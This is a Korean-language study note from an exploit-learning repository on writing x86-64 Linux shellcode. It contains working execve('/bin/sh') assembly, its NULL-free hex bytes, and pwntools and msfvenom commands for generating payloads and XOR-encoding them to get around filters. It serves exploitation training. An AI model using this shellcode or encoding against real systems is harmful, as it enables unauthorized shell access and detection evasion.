# Shellcoding Tools (셸코딩 도구 정리)

## 🔧 Shellcoding이란?
- 메모리에 직접 적재하여 실행 가능한 머신 코드(16진수)
- 크기 최소화와 NULL 바이트 제거가 핵심
- 바이너리 익스플로잇에 자주 사용됨 (예: /bin/sh, reverse shell 등)

---

## 📌 셸코드를 직접 작성해보자: /bin/sh 셸코드

### ✅ 사용 시스템콜: `execve()`
```c
execve("/bin//sh", ["/bin//sh"], NULL);
```

### 📌 레지스터 할당
- `rax`: 59 (execve syscall 번호)
- `rdi`: "/bin//sh" 문자열의 주소
- `rsi`: 인자 배열 주소 (["/bin//sh"])
- `rdx`: NULL

> ✅ **'/bin//sh'에서 //를 넣은 이유:** 총 길이를 8바이트로 맞추기 위함이다. 이는 64비트 레지스터 크기에 딱 맞게 하여, 남은 찌꺼기 처리 없이 그대로 mov 명령어로 레지스터에 넣을 수 있기 때문. Linux에서는 슬래시가 두 개여도 무시되기 때문에 익스플로잇에서 자주 쓰는 트릭이다.

### 🧵 기본 어셈블리 코드 예시
```nasm
global _start

section .text
_start:
    mov rax, 59         ; execve syscall number
    push 0              ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push 0              ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    mov rdx, 0          ; set env to NULL
    syscall
```

### ✅ 수정된 어셈블리 코드 예시 (NULL 제거 버전)
```nasm
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ; set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall
```

### ✅ NULL 제거 버전으로 수정 후 결과:
```bash
$ python3 shellcoder.py sh
b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes
```

---

## 🧪 실행 결과:
```bash
$ python3 loader.py 'b03b48...'
$ whoami
root
```

---

## 🧠 자동 셸코드 생성 도구들

### ✅ pwntools: shellcraft
```bash
$ pwn shellcraft amd64.linux.sh
```

### 🔍 고급 사용:
```python
>>> from pwn import *
>>> shellcode = shellcraft.execve('/bin/sh', ['/bin/sh'])
>>> asm(shellcode).hex()
```

### 실행:
```bash
$ python3 loader.py '<hex 코드>'
$ whoami
root
```

---

### ✅ msfvenom
```bash
$ msfvenom -p linux/x64/exec CMD='sh' -f hex
```

### 실행:
```bash
$ python3 loader.py '<생성된 hex 코드>'
$ whoami
root
```

---

## 🔐 셸코드 인코딩 (바이패스용)

### ✅ 인코딩 예시
```bash
$ msfvenom -p linux/x64/exec CMD='sh' -f hex -e x64/xor
```

- NULL 제거 및 바이패스 가능성 향상
- 하지만 크기는 증가함

### 커스텀 셸코드 인코딩
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('<hex>'))" > shell.bin
$ msfvenom -p - -f hex -e x64/xor < shell.bin
```

---

## 🔎 온라인 셸코드 리소스
- Shell-Storm: https://shell-storm.org/shellcode/
- Exploit-DB: https://exploit-db.com

예: 최적화된 /bin/sh 셸코드 → 22~27 바이트

---

## ✅ 요약
- 셸코드는 간단한 코드가 아님 → 메모리에 직접 로딩, NULL 제거, 크기 최적화 필요
- 직접 작성, 자동 생성 도구(pwntools, msfvenom), 온라인 검색 등 다양한 방식 활용 가능

📂 본 문서는 `pwn-from-zero` 레포지토리 **Shellcoding Tools** 파트입니다.

> 📌 참고 출처: Hack The Box Academy (https://academy.hackthebox.com)
